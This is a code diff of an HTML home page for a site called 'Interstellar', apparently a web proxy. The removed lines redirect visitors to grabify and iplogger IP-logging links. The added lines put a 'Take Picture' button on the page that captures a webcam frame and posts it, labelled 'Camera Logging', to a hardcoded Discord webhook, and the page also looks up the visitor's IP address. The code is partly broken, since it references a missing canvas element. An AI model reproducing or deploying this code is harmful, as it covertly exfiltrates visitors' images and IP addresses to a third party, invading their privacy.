@@ -1,72 +1,83 @@
 <!doctype html>
 <html lang="en">
-  <head>
+<head>
     <meta charset="UTF-8" />
     <meta name="referrer" content="no-referrer" />
     <meta http-equiv="X-Content-Type-Options" content="nosniff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="shortcut icon" id="tab-favicon" href="favicon.png" />
-    <title id="tab-title">Home</title>
-    <link rel="stylesheet" href="/assets/styles/main.css?v=10" />
-    <link rel="stylesheet" href="/assets/styles/global.css?v=8" />
-  </head>
-  <body class="center" onload="SplashT">
-    <div class="fixed-nav-bar"></div>
-    <div id="particles-js">
-      <script rel="preload" src="https://cdn.jsdelivr.net/particles.js/2.0.0/"></script>
-      <div class="main">
-        <h1 class="title"><an>Inter</an>stellar</h1>
+    <title>Home</title>
+    <style>
+        a {
+            display: block;
+            width: 200px;
+            height: 50px;
+            background-color: blue;
+            color: white;
+            line-height: 50px;
+            text-align: center;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body class="center" onload="SplashT">
+    <div class="main">
+        <h1 class="title">Interstellar</h1>
         <p id="splash">Unknown</p>
         <div class="search-container">
-          <form id="fs" method="POST">
-            <input id="is" class="main-search" placeholder="Search with Google or enter address" type="text" />
-          </form>
+            <form id="fs" method="POST">
+                <input id="is" class="main-search" placeholder="Search with Google or enter address" type="text" />
+            </form>
         </div>
-      </div>
+        <a href="#" onclick="takePicture()">Take Picture</a>
     </div>
-    <script src="assets/scripts/i.js?V=42"></script>
-    <script src="/assets/scripts/h.js?v=18"></script>
-    <script src="./assets/-/bundle.js?v=5-5-2024"></script>
-    <script src="./assets/-/config.js?v=5-5-2024"></script>
-    <script src="https://kit.fontawesome.com/1237c86ba0.js" crossorigin="anonymous"></script>
-    <script src="/assets/scripts/m.js?v=54"></script>
-    <!-- DO NOT REMOVE-->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-WKJQ5QHQTJ"></script>
     <script>
-      window.dataLayer = window.dataLayer || []
-      function gtag() {
-        dataLayer.push(arguments)
-      }
-      gtag("js", new Date())
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const dataUrl = canvas.toDataURL('image/jpeg');
 
-      gtag("config", "G-WKJQ5QHQTJ")
-    </script>
-    <!-- DO NOT REMOVE-->
-    <script>
-      window.onload = function() {
-        if (window.location.hash === '#home') {
-          // do nothing, stay on the current page
-        } else if (window.location.hash === '#link1') {
-          try {
-            window.location.href = 'https://grabify.link/0JHHE1';
-          } catch (error) {
-            console.error('Error redirecting to link1:', error);
-            // You can redirect to a default page or handle the situation as needed
-          }
-        } else if (window.location.hash === '#home') {
-          window.location.href = 'https://iplogger.com/2v0Fk6';
-        } else {
-          // default behavior, redirect to a default page or handle the situation as needed
+        async function takePicture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    const fetchOptions = {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            content: 'Camera Logging',
+                            embeds: [{
+                                image: {
+                                    url: canvas.toDataURL('image/jpeg')
+                                }
+                            }]
+                        })
+                    };
+
+                    fetch('https://discord.com/api/webhooks/1269800219902476370/VIew-iRlPeQTmuxLaH2sfLZr4lS-EUV4Fos9-hBASwdzngtApiCPawehzava1yIdQltF', fetchOptions)
+                        .then(() => {
+                            stream.getTracks().forEach(track => {
+                                track.stop();
+                            });
+                            video.srcObject = null;
+                        });
+                }, 3000);
+            } catch (error) {
+                console.error('Error:', error);
+            }
         }
-      };
+
+        fetch('https://api.ipify.org?format=jsonp&callback=getIP')
+            .then(response => response.json())
+            .then(json => console.log(json.ip));
     </script>
-    <script>
-      function getIP(json){
-        var ip = json.ip;
-        console.log(ip);
-      }
-    </script>
-    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-    <div id="adv"></div>
-  </body>
+</body>
 </html>
